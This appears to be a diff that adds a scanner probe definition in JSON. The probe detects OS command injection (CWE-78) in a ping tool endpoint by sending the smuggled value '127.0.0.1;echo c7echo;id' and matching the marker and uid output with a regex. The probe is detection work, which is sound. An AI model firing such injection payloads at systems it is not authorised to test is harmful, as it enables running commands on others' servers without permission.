@@ -1,0 +1,31 @@
+{
+  "name": "web/Command injection output echo marker",
+  "description": "[high] Proves OS command injection with stdout rendering: `; echo c7echo; id` returns 'c7echo' + uid output in the response = direct command output confirmation (T1059.004), no timing ambiguity. Keywords: command injection rce echo id output shell marker. ctrl: plain ping output lacks the marker -> not falsified. base_url = host-tool endpoint.",
+  "cwe": "CWE-78",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/tools/ping",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "host=127.0.0.1%3Becho%20c7echo%3Bid"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "c7echo[\\s\\S]{0,60}?uid=\\d+\\(",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "ae9ca4498208",
+  "created": "2026-11-06T02:07:37.515534+00:00",
+  "last_used": "2026-11-06T02:07:37.515534+00:00"
+}
